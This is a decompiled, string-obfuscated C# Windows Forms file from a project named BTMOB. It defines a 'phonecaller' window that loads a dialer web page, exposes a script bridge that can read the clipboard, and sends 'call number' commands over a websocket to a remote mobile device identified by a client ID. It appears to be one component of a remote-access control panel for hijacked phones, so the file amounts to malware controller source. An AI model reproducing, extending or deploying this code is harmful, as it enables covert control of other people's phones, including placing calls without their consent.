using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace BTMOB;

[DesignerGenerated]
public class phonecaller : Form
{
	[ComVisible(true)]
	public class mybridge
	{
		public phonecaller mainform;

		public mybridge(phonecaller minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public object callit(string thenum)
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.callnumber(thenum);
			}));
			return "";
		}

		[DispId(2)]
		public object alertit(string thenum)
		{
			mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				mainform.alertit(thenum);
			}));
			return "";
		}

		[DispId(3)]
		public string getClipboardText()
		{
			string result;
			try
			{
				result = System.Windows.Forms.Clipboard.GetText();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				result = "";
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("myico")]
	private PictureBox _myico;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mytitle")]
	private Label _mytitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	public BTClient Btcli;

	private bool keepmeto;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numview")]
	internal virtual WebView2 numview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("spl2")]
	internal virtual DrakeWidth_W spl2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual PictureBox myico
	{
		[CompilerGenerated]
		get
		{
			return _myico;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = mytitle_MouseDown;
			PictureBox pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_myico = value;
			pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	public virtual Label mytitle
	{
		[CompilerGenerated]
		get
		{
			return _mytitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = mytitle_MouseDown;
			Label label = _mytitle;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_mytitle = value;
			label = _mytitle;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W7")]
	internal virtual DrakeWidth_W DrakeWidth_W7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W8")]
	internal virtual DrakeWidth_W DrakeWidth_W8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W6")]
	internal virtual DrakeWidth_W DrakeWidth_W6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon pinbtn
	{
		[CompilerGenerated]
		get
		{
			return _pinbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = pinbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_pinbtn = value;
			drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public phonecaller()
	{
		base.Load += phonecaller_Load;
		keepmeto = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.phonecaller));
		this.Panel1 = new System.Windows.Forms.Panel();
		this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.mytitle = new System.Windows.Forms.Label();
		this.myico = new System.Windows.Forms.PictureBox();
		this.spl2 = new DrakeUI.Framework.DrakeWidth_W();
		this.closbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.numview = new Microsoft.Web.WebView2.WinForms.WebView2();
		this.DrakeWidth_W7 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W8 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W5 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W6 = new DrakeUI.Framework.DrakeWidth_W();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numview).BeginInit();
		base.SuspendLayout();
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel1.Controls.Add(this.pinbtn);
		this.Panel1.Controls.Add(this.mytitle);
		this.Panel1.Controls.Add(this.myico);
		this.Panel1.Controls.Add(this.spl2);
		this.Panel1.Controls.Add(this.closbtn);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.ForeColor = System.Drawing.Color.White;
		this.Panel1.Location = new System.Drawing.Point(2, 2);
		this.Panel1.Name = EXGuarder._4F314A73;
		this.Panel1.Padding = new System.Windows.Forms.Padding(10);
		this.Panel1.Size = new System.Drawing.Size(569, 56);
		this.Panel1.TabIndex = 1;
		this.pinbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pinbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.pinbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.Font = new System.Drawing.Font(EXGuarder._600F4A05, 10f);
		this.pinbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pinbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pinbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pinbtn.Location = new System.Drawing.Point(475, 10);
		this.pinbtn.Name = EXGuarder._02183A4F;
		this.pinbtn.Radius = 15;
		this.pinbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.pinbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.pinbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pinbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pinbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pinbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.pinbtn.Size = new System.Drawing.Size(37, 36);
		this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pinbtn.Symbol = 57474;
		this.pinbtn.SymbolSize = 20;
		this.pinbtn.TabIndex = 45;
		this.mytitle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mytitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mytitle.Font = new System.Drawing.Font(EXGuarder._600F4A05, 8f);
		this.mytitle.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.mytitle.Location = new System.Drawing.Point(64, 10);
		this.mytitle.Name = EXGuarder._06086116;
		this.mytitle.Size = new System.Drawing.Size(448, 36);
		this.mytitle.TabIndex = 40;
		this.mytitle.Text = EXGuarder._0B226565;
		this.mytitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.myico.Dock = System.Windows.Forms.DockStyle.Left;
		this.myico.Location = new System.Drawing.Point(10, 10);
		this.myico.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.myico.Name = EXGuarder._64267774;
		this.myico.Size = new System.Drawing.Size(54, 36);
		this.myico.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.myico.TabIndex = 39;
		this.myico.TabStop = false;
		this.spl2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.spl2.Dock = System.Windows.Forms.DockStyle.Right;
		this.spl2.Location = new System.Drawing.Point(512, 10);
		this.spl2.Name = EXGuarder._20500F3E;
		this.spl2.Size = new System.Drawing.Size(10, 36);
		this.spl2.TabIndex = 37;
		this.closbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.closbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.closbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Font = new System.Drawing.Font(EXGuarder._600F4A05, 10f);
		this.closbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closbtn.Location = new System.Drawing.Point(522, 10);
		this.closbtn.Name = EXGuarder._16656D6E;
		this.closbtn.Radius = 15;
		this.closbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.closbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.closbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.closbtn.Size = new System.Drawing.Size(37, 36);
		this.closbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.closbtn.Symbol = 61527;
		this.closbtn.SymbolSize = 20;
		this.closbtn.TabIndex = 44;
		this.numview.AllowExternalDrop = true;
		this.numview.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.numview.CreationProperties = null;
		this.numview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.numview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.numview.ForeColor = System.Drawing.Color.White;
		this.numview.Location = new System.Drawing.Point(2, 58);
		this.numview.Name = EXGuarder._6B5B773D;
		this.numview.Size = new System.Drawing.Size(569, 830);
		this.numview.TabIndex = 2;
		this.numview.ZoomFactor = 1.0;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W7.Cursor = System.Windows.Forms.Cursors.SizeWE;
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(571, 0);
		this.DrakeWidth_W7.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W7.Name = EXGuarder._1E150665;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(2, 890);
		this.DrakeWidth_W7.TabIndex = 35;
		this.DrakeWidth_W8.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W8.Cursor = System.Windows.Forms.Cursors.SizeNS;
		this.DrakeWidth_W8.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W8.Location = new System.Drawing.Point(2, 888);
		this.DrakeWidth_W8.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W8.Name = EXGuarder._5A461B60;
		this.DrakeWidth_W8.Size = new System.Drawing.Size(569, 2);
		this.DrakeWidth_W8.TabIndex = 37;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W5.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W5.Name = EXGuarder._1C231F02;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(2, 890);
		this.DrakeWidth_W5.TabIndex = 38;
		this.DrakeWidth_W6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W6.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W6.Location = new System.Drawing.Point(2, 0);
		this.DrakeWidth_W6.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.DrakeWidth_W6.Name = EXGuarder._0D792916;
		this.DrakeWidth_W6.Size = new System.Drawing.Size(569, 2);
		this.DrakeWidth_W6.TabIndex = 39;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(573, 890);
		base.Controls.Add(this.numview);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.DrakeWidth_W6);
		base.Controls.Add(this.DrakeWidth_W8);
		base.Controls.Add(this.DrakeWidth_W7);
		base.Controls.Add(this.DrakeWidth_W5);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._64786804);
		base.Name = EXGuarder._70320560;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._70320560;
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numview).EndInit();
		base.ResumeLayout(false);
	}

	private async void phonecaller_Load(object sender, EventArgs e)
	{
		await numview.EnsureCoreWebView2Async();
		numview.NavigationCompleted += WebView_NavigationCompleted;
		numview.NavigateToString(Resources.dailer);
		mybridge rawObject = new mybridge(this);
		numview.CoreWebView2.AddHostObjectToScript("mybridge", rawObject);
		numview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
		numview.CoreWebView2.Settings.AreDevToolsEnabled = false;
		myico.Image = Btcli.wallpaper;
		mytitle.Text = Btcli.name;
	}

	private void WebView_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
	{
	}

	public void callnumber(string num)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._6D6B6A2C, EXGuarder._64282309);
		dictionary.Add(EXGuarder._5C062248, EXGuarder._3D777773);
		dictionary.Add(EXGuarder._0B764B15, num);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	public void alertit(string msg)
	{
		BTAlerter.infos(msg);
	}

	private void closbtn_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void pinbtn_Click(object sender, EventArgs e)
	{
		if (keepmeto)
		{
			pinbtn.ForeColor = Color.DeepSkyBlue;
			pinbtn.RectColor = Color.DeepSkyBlue;
			Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = false;
		}
		else
		{
			pinbtn.ForeColor = Color.White;
			pinbtn.RectColor = Color.Gray;
			Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}

	private void mytitle_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}
}
